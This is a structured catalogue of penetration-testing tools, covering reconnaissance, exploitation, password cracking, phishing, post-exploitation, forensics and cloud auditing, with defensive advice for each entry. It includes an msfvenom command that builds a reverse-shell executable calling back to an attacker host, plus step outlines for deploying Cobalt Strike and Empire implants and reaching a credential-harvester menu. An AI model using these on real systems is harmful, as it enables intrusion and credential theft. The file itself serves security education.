description: A comprehensive, structured list of cybersecurity commands for educational and authorized penetration testing purposes. Each entry includes defensive context to promote ethical security practices and covers a wide range of tools available in distributions like Kali Linux.

metadata.author: Cybersecurity Community
metadata.warning: Use only on systems you own or have explicit written permission to test

categories.category_description: Gathering information from publicly available sources without direct interaction with the target's systems.

commands.description: Queries the Whois database for domain registration details like owner, contact info, and name servers.
commands.defensive_context: Domain privacy services can be used to redact personal information from Whois records. Security teams should monitor Whois changes for potential domain hijacking.

commands.description: Performs DNS queries to retrieve various records (A, MX, NS, TXT) associated with a domain.
commands.defensive_context: Limit the amount of sensitive information stored in public DNS records (e.g., in TXT records). Use services like DNSSEC to ensure the integrity of DNS responses.

commands.description: Gathers emails, subdomains, hosts, and employee names from various public sources like search engines and social media.
commands.defensive_context: Educate employees on the information they share on public platforms. Implement DMARC, DKIM, and SPF to protect against email spoofing.

commands.description: Searches the Shodan database for internet-connected devices, services, and potential vulnerabilities.
commands.defensive_context: Regularly scan your own public IP ranges to identify and remediate unintentionally exposed services. Implement strong firewall rules to restrict access to necessary ports only.

commands.description: A fast passive subdomain discovery tool that queries multiple online sources.
commands.defensive_context: Maintain an asset inventory of all official subdomains. Use Certificate Transparency log monitoring to detect the creation of unauthorized subdomains.

commands.description: Extracts metadata from public documents (pdf, doc, xls, etc.) belonging to a target company.
commands.defensive_context: Implement policies for scrubbing metadata from publicly released documents. Educate users on the risks of sensitive information leakage through file metadata.

commands.description: Interactive data mining tool that renders directed graphs for link analysis and data visualization.
commands.example_usage: Launch Maltego and use transforms to map relationships between domains, emails, and infrastructure.
commands.defensive_context: Monitor for data aggregation from public sources. Implement data classification policies to control what information is publicly available.

commands.description: Web reconnaissance framework with independent modules, database interaction, and built-in convenience functions.
commands.example_usage: recon-ng, workspaces create example, use recon/domains-hosts/google_site_web, set source example.com, run
commands.defensive_context: Regularly audit your digital footprint using similar tools. Limit information disclosure in public code repositories and technical documents.

commands.description: Performs in-depth DNS enumeration and network mapping to discover subdomains and infrastructure.
commands.defensive_context: Use wildcard DNS records carefully. Monitor certificate transparency logs and DNS queries to detect enumeration activities.

commands.description: OSINT automation tool that integrates with dozens of data sources to gather and analyze intelligence on IPs, domains, emails, etc.
commands.defensive_context: Understand your organization's public footprint by running SpiderFoot against your own assets. Minimize public data exposure where possible.

categories.category_description: Discovering hosts, services, and network infrastructure through active probing.

commands.description: Network mapper for port scanning, service version detection, and running NSE scripts for vulnerability discovery.
commands.defensive_context: Deploy firewalls and Intrusion Detection/Prevention Systems (IDS/IPS) to detect and block aggressive scans. Close all unnecessary ports on systems.

commands.description: Extremely fast TCP port scanner for scanning large IP ranges quickly.
commands.defensive_context: Rate-limiting and IP-based blocking can help mitigate the effectiveness of high-speed scanners. IDS/IPS systems are key for detection.

commands.description: Active/passive ARP reconnaissance tool for discovering live hosts on a network segment.
commands.defensive_context: Implement port security on network switches to prevent unauthorized devices. Monitor for ARP anomalies and use network access control (NAC).

commands.description: Network tool able to send custom TCP/IP packets and display target replies like ping does with ICMP replies.
commands.defensive_context: Configure firewalls to drop unwanted packet types. Use IDS/IPS to detect packet crafting and unusual scan patterns.

commands.description: A next-generation reimplementation of Enum4linux for enumerating information from Windows and Samba systems.
commands.defensive_context: Disable NetBIOS over TCP/IP, restrict anonymous access to SMB shares, and implement strict network access controls for ports 139/445.

commands.description: Discovers hosts on the local network by sending ARP packets and displaying the responses.
commands.defensive_context: Use Dynamic ARP Inspection (DAI) on capable network hardware. Monitor for unusual levels of ARP traffic as a sign of scanning.

categories.category_description: Identifying vulnerabilities and security issues in web applications and services.

commands.description: Integrated platform for performing security testing of web applications with various tools including proxy, scanner, and intruder.
commands.example_usage: Configure browser proxy to 127.0.0.1:8080 and use Burp to intercept/modify requests
commands.defensive_context: Implement WAF (Web Application Firewall), input validation, and output encoding. Regularly conduct security code reviews and penetration tests.

commands.description: Open source web application security scanner with automated and manual testing capabilities.
commands.defensive_context: Follow OWASP security guidelines. Implement security headers (CSP, HSTS) and conduct regular vulnerability assessments.

commands.description: Automatic SQL injection and database takeover tool with extensive detection engine and takeover capabilities.
commands.defensive_context: Use parameterized queries/prepared statements, input validation, and principle of least privilege for database accounts. Implement WAF with SQLi rules.

commands.description: Advanced XSS detection and exploitation suite with powerful fuzzing engine.
commands.defensive_context: Implement Content Security Policy (CSP), input validation, and output encoding. Use security headers like X-XSS-Protection.

commands.description: Web content scanner that looks for existing and/or hidden web objects using wordlists.
commands.defensive_context: Disable directory listings, use non-obvious directory names, and implement proper access controls. Monitor for 404 errors indicating scanning activity.

commands.description: Fast web fuzzer written in Go used for directory/file fuzzing, virtual host discovery, and parameter fuzzing.
commands.defensive_context: Implement rate limiting, WAF protection, and monitor for brute force patterns in web logs.

commands.description: A fast tool for brute-forcing URIs (directories and files), DNS subdomains, and virtual host names.
commands.defensive_context: Use non-predictable naming for sensitive files/directories. Implement rate limiting and monitor for a high rate of 404 responses from a single IP.

commands.description: Automated command injection and exploitation tool. Can detect and exploit command injection flaws in web applications.
commands.defensive_context: Strongly validate and sanitize all user-supplied input. Avoid using shell commands with user input. Use safe APIs for system calls.

categories.category_description: Systematic identification and analysis of security vulnerabilities in systems and applications.

commands.description: Comprehensive vulnerability scanner with extensive plugin database for network and application vulnerabilities.
commands.defensive_context: Establish regular vulnerability scanning program, prioritize patching based on risk, and implement configuration management.

commands.description: Full-featured vulnerability management system with web interface and comprehensive scanning capabilities.
commands.defensive_context: Use vulnerability management as part of defense-in-depth strategy. Correlate scan results with threat intelligence.

commands.description: Fast and customizable vulnerability scanner based on simple YAML-based template definitions.
commands.defensive_context: Subscribe to vulnerability feeds and use defensive scanning to identify exposed vulnerabilities before attackers do.

commands.description: Web server scanner that tests for dangerous files/CGIs, outdated server software, and other problems.
commands.defensive_context: Harden web servers following security benchmarks (CIS), keep software updated, and remove unnecessary files/CGIs.

commands.description: Black box WordPress security scanner to find security weaknesses in WordPress installations and their plugins/themes.
commands.defensive_context: Keep WordPress core, themes, and plugins updated. Use strong, unique passwords and enable 2FA. Limit plugin usage to trusted sources.

commands.description: A GUI-based, semi-automated network penetration testing framework that automates scanning with tools like Nmap, Nikto, and Dirb.
commands.example_usage: Launch Legion GUI, add hosts, and run scans.
commands.defensive_context: Understand that attackers use automated tools. A strong defensive posture with IDS/IPS and proactive patching is crucial.

categories.category_description: Tools and frameworks for developing, testing, and executing exploit code against target systems.

commands.description: Comprehensive penetration testing framework with exploit development, testing, and execution capabilities.
commands.defensive_context: Implement patch management, application whitelisting, EDR solutions, and network segmentation to limit exploit impact.

commands.description: Command-line search tool for Exploit-DB that allows offline exploitation research.
commands.defensive_context: Monitor for public exploit releases related to your software stack and prioritize patching accordingly.

commands.description: Standalone payload generator that combines msfpayload and msfencode for creating custom payloads.
commands.example_usage: msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o payload.exe
commands.defensive_context: Deploy EDR solutions, application whitelisting, and conduct regular malware analysis training.

commands.description: The ultimate WinRM shell for hacking. Useful for post-exploitation on Windows systems where WinRM is enabled.
commands.defensive_context: Disable WinRM if not required. If required, use strong passwords, implement network segmentation, and log PowerShell activity.

commands.description: A commercial adversary simulation and red team operations platform. Used for post-exploitation and lateral movement.
commands.example_usage: Start teamserver, connect client, generate beacon payload, and deploy on target.
commands.defensive_context: Use EDR solutions to detect beaconing activity. Monitor for suspicious PowerShell usage and network traffic to unknown domains.

categories.category_description: Techniques and tools for testing password strength, cracking hashes, and testing authentication mechanisms.

commands.description: Fast password cracker currently available for many flavors of Unix, Windows, DOS, and OpenVMS.
commands.defensive_context: Use strong, complex passwords with salts, implement account lockout policies, and use multi-factor authentication.

commands.description: Advanced password recovery tool supporting five unique modes of attack for over 300 highly-optimized hashing algorithms.
commands.defensive_context: Use modern hashing algorithms (bcrypt, Argon2), implement password complexity requirements, and monitor for hash dumping attempts.

commands.description: Parallelized login cracker which supports numerous protocols to attack.
commands.defensive_context: Implement account lockout policies, rate limiting, CAPTCHA, and multi-factor authentication for sensitive services.

commands.description: Wordlist generator that can create custom wordlists based on specified character sets and patterns.
commands.defensive_context: Enforce strong password policies that require sufficient length and complexity to resist brute force attacks.

commands.description: A speedy, parallel, modular, login brute-forcer supporting numerous services.
commands.defensive_context: Utilize Intrusion Prevention Systems (IPS) to detect and block brute-force attempts. Enforce strict account lockout policies.

commands.description: Custom Wordlist Generator that spiders a given URL to a specified depth, collecting words that can be used for password cracking.
commands.defensive_context: Educate users not to use passwords related to their work or personal information found on public websites. Enforce password complexity.

categories.category_description: Tools and techniques for assessing the security of wireless networks and protocols.

commands.description: Complete tool suite to assess WiFi network security covering monitoring, attacking, testing and cracking.
commands.defensive_context: Use WPA3 where available, implement strong passphrases, disable WPS, and monitor for rogue access points.

commands.description: Wireless network detector, sniffer, and intrusion detection system that works with any raw 802.11 card.
commands.defensive_context: Use wireless intrusion detection systems (WIDS), regularly scan for rogue access points, and implement 802.1X authentication.

commands.description: Automated wireless attack tool that simplifies the process of auditing WEP, WPA, and WPS enabled networks.
commands.defensive_context: Disable WPS, use WPA3 with strong passwords, implement MAC filtering where appropriate, and monitor for deauth attacks.

commands.description: Performs a brute force attack against Wi-Fi Protected Setup (WPS) registrar PINs to recover WPA/WPA2 passphrases.
commands.defensive_context: Disable WPS on all wireless access points. Modern devices have brute-force protection, but disabling is the safest option.

commands.description: A powerful, flexible, and portable tool for Man-in-the-Middle attacks. Can be used for Wi-Fi sniffing, spoofing, and credential harvesting.
commands.defensive_context: Use VPNs on untrusted networks. Implement HSTS and certificate pinning in applications. Educate users about phishing and fake access points.

categories.category_description: Tools and techniques for testing human factors and organizational security awareness.

commands.description: Open-source penetration testing framework designed for social engineering attacks with numerous attack vectors.
commands.example_usage: Select: 1) Social-Engineering Attacks, 2) Website Attack Vectors, 3) Credential Harvester Attack Method
commands.defensive_context: Implement security awareness training, email filtering, web filtering, and multi-factor authentication.

commands.description: Open-source phishing framework that makes it easy to test organizational phishing susceptibility.
commands.example_usage: Access web interface at https://localhost:3333 after starting
commands.defensive_context: Conduct regular phishing simulations, implement DMARC/DKIM/SPF, and provide continuous security awareness education.

commands.description: Phishing campaign toolkit used for creating and managing multiple simultaneous phishing attacks with custom email and server content.
commands.example_usage: Launch GUI and configure template, target list, and server settings
commands.defensive_context: Deploy advanced email security gateways, implement URL filtering, and train users to identify suspicious emails.

commands.description: A man-in-the-middle attack framework used for phishing login credentials along with session cookies, which in turn allows bypassing 2-factor authentication.
commands.defensive_context: Use FIDO2/U2F hardware tokens as they are resistant to phishing. Train users to inspect URLs and be wary of unexpected login prompts.

categories.category_description: Techniques and tools for maintaining access, escalating privileges, and establishing persistence on compromised systems.

commands.description: Tool to extract plaintext passwords, hash, PIN code and kerberos tickets from memory and perform pass-the-hash attacks.
commands.defensive_context: Enable Credential Guard, implement LSA protection, restrict debug privileges, and monitor for LSASS access.

commands.description: Collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.
commands.defensive_context: Implement PowerShell logging, constrained language mode, and application whitelisting. Monitor for unusual PowerShell activity.

commands.description: Uses graph theory to reveal hidden relationships and attack paths in Active Directory environments.
commands.defensive_context: Regularly audit AD permissions, implement principle of least privilege, and monitor for BloodHound-related reconnaissance.

commands.description: Linux Privilege Escalation Awesome Script that searches for possible paths to escalate privileges on Linux/Unix hosts.
commands.defensive_context: Harden Linux systems following CIS benchmarks, implement proper file permissions, and regularly audit SUID/GUID files.

commands.description: Windows Privilege Escalation Awesome Script that searches for possible privilege escalation paths on Windows hosts.
commands.defensive_context: Implement least privilege, regularly patch systems, audit service permissions, and monitor for privilege escalation attempts.

commands.description: A post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure-Python 2.6/2.7 Linux/OS X agent. Now merged with Starkiller.
commands.example_usage: Start server, start client, generate stager, deploy on target, interact with agent.
commands.defensive_context: Utilize EDRs, constrain PowerShell execution policies, enable script block logging, and monitor network for C2 traffic.

commands.description: A fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Useful for pivoting into internal networks.
commands.defensive_context: Monitor for anomalous HTTP/S traffic, especially long-lived connections. Use egress filtering and proxy inspection to detect tunneling.

categories.category_description: Tools and techniques for investigating security incidents, analyzing evidence, and conducting forensic examinations.

commands.description: Digital forensics platform and graphical interface to The Sleuth Kit with timeline analysis, hash filtering, and keyword search.
commands.example_usage: Launch GUI and create new case, add evidence source (disk image)
commands.defensive_context: Maintain proper evidence handling procedures, implement comprehensive logging, and establish incident response capabilities.

commands.description: Advanced memory forensics framework for incident response and malware analysis from RAM captures.
commands.defensive_context: Implement memory protection mechanisms, conduct regular memory analysis training, and maintain memory acquisition capabilities.

commands.description: World's foremost network protocol analyzer with deep inspection of hundreds of protocols and live capture capabilities.
commands.defensive_context: Use encrypted protocols, implement network segmentation, and monitor for suspicious network traffic patterns.

commands.description: Computer forensics tool that scans disk images, files, or directories and extracts useful information without parsing the file system.
commands.defensive_context: Implement data loss prevention, encrypt sensitive data at rest, and securely wipe media before disposal.

commands.description: A collection of command-line tools and a C library that allows for forensic analysis of disk images.
commands.defensive_context: Maintain system logs and use file integrity monitoring (FIM) to provide a baseline for forensic analysis.

commands.description: A free endpoint security tool from FireEye/Mandiant for in-depth memory and file analysis to find signs of malicious activity.
commands.example_usage: Launch Redline, create a collector, run collector on target system, then analyze results in Redline.
commands.defensive_context: Deploy EDR solutions to provide similar endpoint visibility continuously. Establish baselines of normal system activity.

categories.category_description: Tools and techniques for analyzing malware, binaries, and understanding software behavior.

commands.description: Software reverse engineering suite developed by NSA with disassembly, decompilation, and scripting capabilities.
commands.example_usage: Launch GUI, create project, import binary, and begin analysis
commands.defensive_context: Use code obfuscation, implement anti-reverse engineering techniques, and conduct regular code reviews.

commands.description: Free and open-source reverse engineering framework with disassembler, debugger, and forensics capabilities.
commands.defensive_context: Implement code signing, use packers cautiously, and conduct security testing throughout development lifecycle.

commands.description: Displays printable character sequences in binary files, useful for quick analysis of embedded text.
commands.defensive_context: Avoid hardcoding sensitive information in binaries, use secure storage for credentials, and strip debug symbols from production builds.

commands.description: An open-source x64/x32 debugger for Windows. Used for malware analysis and reverse engineering of Windows executables.
commands.example_usage: Launch x64dbg and attach to a running process or open an executable.
commands.defensive_context: Implement anti-debugging techniques in sensitive applications. Use code obfuscation and packing to hinder analysis.

commands.description: A commercial, multi-processor disassembler and debugger that is a de-facto industry standard for reverse engineering.
commands.example_usage: Launch IDA Pro, open a binary, and allow auto-analysis to complete before exploring functions.
commands.defensive_context: Secure coding practices and code signing are fundamental defenses. Complex software is harder to reverse engineer effectively.

categories.category_description: Tools and techniques for assessing the security of cloud environments and configurations.

commands.description: AWS exploitation framework designed for testing cloud security through offensive security techniques.
commands.example_usage: python3 pacu.py, list modules, run iam__enum_permissions
commands.defensive_context: Implement least privilege IAM policies, enable CloudTrail logging, use AWS Config for compliance monitoring, and conduct regular security assessments.

commands.description: Multi-cloud security auditing tool that assesses cloud environments against security best practices.
commands.defensive_context: Regularly audit cloud configurations, implement cloud security posture management (CSPM), and follow cloud security best practices.

commands.description: Tool to find a company infrastructure, files, and apps on the top cloud providers with multiple permutations.
commands.defensive_context: Implement proper cloud resource naming conventions, use private buckets where appropriate, and monitor for reconnaissance activity.

commands.description: Security tool for AWS, Azure, and GCP to perform security assessments, auditing, hardening, and incident response.
commands.defensive_context: Use tools like Prowler proactively to identify and remediate misconfigurations. Integrate security checks into CI/CD pipelines.

commands.description: An AWS IAM security assessment tool that identifies violations of least privilege and generates a report.
commands.example_usage: cloudsplaining download --profile my-aws-profile && cloudsplaining scan --input-file iam-data.json
commands.defensive_context: Regularly audit IAM policies for excessive permissions. Use IAM Access Analyzer to identify unintended resource access.

categories.category_description: Tools for assessing the security of containerized environments and orchestration platforms.

commands.description: Script that checks for dozens of common best-practices around deploying Docker containers in production.
commands.defensive_context: Follow Docker security benchmarks, use minimal base images, implement image scanning, and enforce runtime security policies.

commands.description: Hunts for security weaknesses in Kubernetes clusters both from outside (remote) and inside (pod) perspectives.
commands.defensive_context: Harden Kubernetes clusters following CIS benchmarks, implement network policies, use Pod Security Standards, and enable audit logging.

commands.description: Simple and comprehensive vulnerability scanner for containers and other artifacts suitable for CI/CD.
commands.defensive_context: Implement container image scanning in CI/CD pipelines, use minimal base images, and maintain patch management for container images.

commands.description: Checks whether Kubernetes is deployed securely by running the checks documented in the CIS Kubernetes Benchmark.
commands.defensive_context: Integrate kube-bench into your cluster deployment process to ensure consistent adherence to security benchmarks.

commands.description: A cloud-native runtime security tool, acting as a threat detection engine for Kubernetes.
commands.example_usage: Install Falco on Kubernetes nodes and monitor logs in /var/log/syslog or configured output.
commands.defensive_context: Deploy runtime security monitoring to detect anomalous behavior within containers and on nodes, such as unexpected shell execution or file access.

ethical_considerations: Always obtain proper authorization before testing
Respect scope and boundaries defined in engagement agreements
Follow responsible disclosure procedures for found vulnerabilities
Do not use these tools for malicious purposes
legal_warnings: Unauthorized use of these tools may violate local and international laws
Maintain detailed documentation of authorized testing activities
Understand and comply with relevant regulations (CFAA, GDPR, etc.)
best_practices: Use dedicated testing environments when possible
Maintain comprehensive notes and evidence collection
